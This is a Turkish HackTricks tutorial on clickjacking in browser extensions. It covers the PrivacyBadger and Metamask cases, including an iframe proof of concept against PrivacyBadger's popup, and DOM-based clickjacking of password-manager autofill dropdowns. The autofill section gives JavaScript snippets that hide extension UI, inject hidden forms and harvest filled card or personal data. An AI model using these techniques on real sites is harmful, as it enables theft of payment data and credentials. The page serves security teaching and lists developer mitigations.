# BrowExt - ClickJacking

{{#include ../../banners/hacktricks-training.md}}

## Temel Bilgiler

Bu sayfa, bir tarayıcı uzantısındaki ClickJacking zafiyetinden faydalanacaktır.\
ClickJacking'in ne olduğunu bilmiyorsanız bakın:


{{#ref}}
../clickjacking.md
{{#endref}}

Uzantılar **`manifest.json`** dosyasını içerir ve bu JSON dosyasında `web_accessible_resources` alanı vardır. Chrome dokümanlarında bu konuda şöyle deniyor:

> These resources would then be available in a webpage via the URL **`chrome-extension://[PACKAGE ID]/[PATH]`**, which can be generated with the **`extension.getURL method`**. Allowlisted resources are served with appropriate CORS headers, so they're available via mechanisms like XHR.[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

Bir tarayıcı uzantısındaki **`web_accessible_resources`**, sadece web üzerinden erişilebilir olmakla kalmaz; aynı zamanda uzantının sahip olduğu ayrıcalıklarla da çalışır. Bu da şu yeteneklere sahip oldukları anlamına gelir:

- Uzantının durumunu değiştirmek
- Ek kaynaklar yüklemek
- Tarayıcı ile belirli ölçüde etkileşimde bulunmak

Ancak bu özellik güvenlik riski taşır. Eğer **`web_accessible_resources`** içindeki bir kaynak önemli bir işlevselliğe sahipse, bir saldırgan bu kaynağı harici bir web sayfasına gömebilir. Bu sayfayı ziyaret eden farkında olmayan kullanıcılar bu gömülü kaynağı istemeden etkinleştirebilirler. Böyle bir etkinleştirme, uzantının kaynaklarının izinleri ve yeteneklerine bağlı olarak istenmeyen sonuçlara yol açabilir.

## PrivacyBadger Örneği

PrivacyBadger uzantısında, `skin/` dizininin `web_accessible_resources` olarak şu şekilde beyan edilmesiyle ilgili bir zafiyet tespit edildi (Check the original [blog post](https://blog.lizzie.io/clickjacking-privacy-badger.html)):
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
Bu yapılandırma potansiyel bir güvenlik sorununa yol açtı. Özellikle tarayıcıdaki PrivacyBadger simgesiyle etkileşimde render edilen `skin/popup.html` dosyası bir `iframe` içine gömülebiliyordu. Bu gömme, kullanıcıları istemeden "Disable PrivacyBadger for this Website" seçeneğine tıklamaya kandırmak için kullanılabilirdi. Böyle bir işlem, PrivacyBadger korumasını devre dışı bırakarak kullanıcının gizliliğini zayıflatır ve kullanıcıyı artan izlemeye maruz bırakabilirdi. Bu istismarın görsel bir demosu ClickJacking video örneğinde şu adreste görülebilir: [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm).

Bu güvenlik açığını gidermek için basit bir çözüm uygulandı: `web_accessible_resources` listesinden `/skin/*` kaldırıldı. Bu değişiklik, `skin/` dizininin içeriğinin web erişilebilir kaynaklar aracılığıyla erişilememesini veya manipüle edilememesini sağlayarak riski etkin bir şekilde azalttı.

Düzeltme basitti: **`web_accessible_resources` listesinden `/skin/*`'i kaldırın**.

### PoC
```html
<!--https://blog.lizzie.io/clickjacking-privacy-badger.html-->

<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}
</style>

<div id="stuff">
<h1>Click the button</h1>
<button id="button">click me</button>
</div>

<iframe
src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## Metamask Örneği

A [**blog post about a ClickJacking in metamask can be found here**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9). Bu durumda Metamask, erişimde kullanılan protokolün **`https:`** veya **`http:`** olduğunu kontrol ederek açığı düzeltti (ör. **`chrome:`** değil):

<figure><img src="../../images/image (21).png" alt=""><figcaption></figcaption></figure>

**Another ClickJacking fixed** in the Metamask extension was that users were able to **Click to whitelist** when a page was suspicious of being phishing because of `“web_accessible_resources”: [“inpage.js”, “phishing.html”]`. O sayfa ClickJacking'e karşı savunmasız olduğundan, saldırgan mağdura fark ettirmeden onu whitelist'e eklettirecek normal görünen bir şey gösterip, sonra whitelist'e alınan phishing sayfaya geri dönebilirdi.

## Steam Inventory Helper Örneği

Aşağıdaki sayfayı inceleyin; bir tarayıcı eklentisindeki bir **XSS**'in nasıl bir **ClickJacking** açığıyla zincirlendiğini gösterir:


{{#ref}}
browext-xss-example.md
{{#endref}}

---

## DOM-based Extension Clickjacking (Parola Yöneticisi Autofill UIs)

Klasik extension Clickjacking, yanlış yapılandırılmış `web_accessible_resources`'ı kötüye kullanarak ayrıcalıklı HTML'i iframe içine alır ve kullanıcı tıklamalarını yönlendirir. Yeni bir sınıf olan DOM-based extension Clickjacking, parola yöneticilerinin sayfa DOM'una enjekte ettiği autofill açılır menülerini hedefler ve CSS/DOM numaralarıyla bunları gizleyip örtbas ederken etkileşimli bırakır. Zorla yaptırılan bir tıklama, saklı bir öğeyi seçip saldırgan kontrollü inputları hassas verilerle doldurabilir.

### Tehdit modeli

- Saldırgan bir web sayfasını kontrol eder (veya ilgili bir domain üzerinde XSS/subdomain takeover/cache poisoning elde eder).
- Mağdurun yüklü ve kilidi açılmış bir parola yöneticisi eklentisi vardır (bazı autofill'ler nominal olarak kilitli olsa bile çalışır).
- En az bir kullanıcı tıklaması tetiklenir (üzeri örtülmüş cookie banner'ları, diyaloglar, CAPTCHAs, oyunlar vb.).

### Saldırı akışı (manuel autofill)

1. Görünmez ancak odaklanabilir bir form enjekte et (login/PII/kredi-kartı alanları).
2. Eklentinin autofill açılır menüsünü alanın yakınında çağırmak için bir input'a odaklan.
3. Eklenti UI'sını gizle veya örtücülük yap ama etkileşimli tut.
4. Gizli açılır menünün altına inandırıcı bir kontrol hizala; böylece bir öğeyi seçtirecek tıklamayı zorla.
5. Saldırgan formundan doldurulan değerleri oku ve exfiltrate et.

### Autofill UI'sını gizleme yöntemleri

- Extension element
- Root element opacity (generic):
```js
// Reduce or nullify opacity of the extension root
// Works when the root element is attached in the page DOM
const root = document.querySelector('protonpass-root')
if (root) root.style.opacity = 0
```
- open ShadowRoot içindeki child (dinamik tag, iç iframe'i gizle):
```js
// Find dynamic root like <protonpass-root-xyz> and hide its child iframe
const root = Array.from(document.querySelectorAll('*'))
.find(el => el.tagName.toLowerCase().startsWith('protonpass-root-'))
if (root?.shadowRoot) {
const frame = root.shadowRoot.querySelector('iframe')
if (frame) frame.style.cssText += 'opacity:0 !important;'
}
```
- Üst öğe
- BODY/HTML opacity hileleri, sayfa normal görünürken extension UI'yi görünmez yapmak için (ör. ekran görüntüsü arka planı):
```js
// Hide full page, then reveal a tiny amount to keep clicks working
document.body.style.opacity = 0
// Optional: Show a screenshot/lookalike to avoid a blank screen
// document.documentElement.style.backgroundImage = 'url(website.png)'

// Inject a credit-card form and focus to trigger dropdown
/* create #cardform with #cardnumber, #expiry, #cvc */
document.getElementById('cardnumber').focus()
// Make body barely visible to allow user interaction
document.body.style.opacity = '0.001'

function getCardValues() {
const num = document.getElementById('cardnumber').value
const exp = document.getElementById('expiry').value
const cvc = document.getElementById('cvc').value
// exfiltrate via XHR/fetch/websocket
}
```
- Overlay
- Kısmi overlay: Dropdown'ın tıklanabilir kalması için birkaç piksel hariç her şeyi örtün (attacker overlay'in DOM'da son eleman ve max z-index'e sahip olduğundan emin olun veya Top Layer kullanın).
- pointer-events:none kullanan tam overlay, böylece tıklamalar gizli dropdown'a geçer; bunu Popover API ile kalıcı tutun:
```html
<div id="overlay" popover style="pointer-events:none;">Cookie consent</div>
<script>
overlay.showPopover()
// Inject a personal data form and focus to trigger dropdown
/* create #personalform with #name/#email/#phone/... */
document.getElementById('name').focus()
function getData(){ /* read + exfil values on change */ }
</script>
```
### Hedef tıklamasının konumlandırılması

- Sabit konumlandırma: gizli açılır menüyü “Çerezleri kabul et”, “Kapat” veya bir CAPTCHA onay kutusu gibi inandırıcı bir kontrolün altına yerleştirin.
- Fareyi takip et: odaklanmış inputu imlecin altına taşıyın, böylece açılır menü onunla birlikte hareket eder; periyodik olarak yeniden odaklayın, böylece herhangi bir yere tek tıklama bir öğeyi seçer:
```js
const f = document.getElementById('name')
document.addEventListener('mousemove', e => {
personalform.style = `top:${e.pageY-50}px;left:${e.pageX-100}px;position:absolute;`
// some managers hide the dropdown if focus is lost; refocus slowly
setTimeout(() => f.focus(), 100)
})
```
### Etki ve senaryolar

- Saldırgan-kontrollü site: zorla yapılan tek bir tıklama domain ile sınırlı olmayan kredi kartı verilerini (numara/son kullanma/CVC) ve kişisel bilgileri (isim, e‑posta, telefon, adres, doğum tarihi) sızdırabilir.
- Güvenilen site üzerinde XSS/subdomain takeover/cache poisoning: birçok şifre yöneticisi ilgili alt alan adları/üst alan adları arasında otomatik doldurma yaptığı için (ör. `*.example.com`) birden fazla tıklamayla kimlik bilgileri (kullanıcı adı/parola) ve TOTP çalınabilir.
- Passkeys: RP WebAuthn challenge'lerini oturuma bağlamazsa, XSS imzalanmış assertion'ı yakalayabilir; DOM-based clickjacking passkey istemini gizleyerek kullanıcının onay tıklamasını aldırır.

### Sınırlamalar

- En az bir kullanıcı tıklaması ve makul düzeyde piksel hizalaması gerekir (gerçekçi örtüler tıklamaları kolayca tetikler).
- Otomatik kilit/çıkış suistimal pencerelerini azaltır; bazı şifre yöneticileri hâlâ “kilitli” iken otomatik doldurma yapmaya devam eder.

### Uzaltı geliştiricileri için önlemler

- Autofill UI'sını Top Layer (Popover API) içinde render edin veya sayfa yığılmasının üzerinde durduğundan emin olun; sayfa tarafından kontrol edilen örtüler tarafından kaplanmamasını sağlayın.
- CSS manipülasyonuna direnin: Closed Shadow DOM tercih edin ve UI köklerinde şüpheli stil değişikliklerini izlemek için `MutationObserver` kullanın.
- Doldurmadan önce düşmanca örtüleri tespit edin: diğer top-layer/popover elementlerini listeleyin, geçici olarak `pointer-events:none`'u devre dışı bırakın ve gizlenmeyi tespit etmek için `elementsFromPoint()` kullanın; örtüler varsa UI'ı kapatın.
- Yükleme öncesi ve sonrası `<body>`/`<html>`'in opaklık veya stil değişikliklerini tespit edin.
- iframe tabanlı sorunlar için: MV3 `web_accessible_resources` `matches`'i dar kapsamlı belirleyin ve HTML UI'ları açığa çıkarmaktan kaçının; kaçınılmaz HTML için `X-Frame-Options: DENY` veya `Content-Security-Policy: frame-ancestors 'none'` başlıklarını servis edin.


## Referanslar

- [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)
- [https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)

{{#include ../../banners/hacktricks-training.md}}
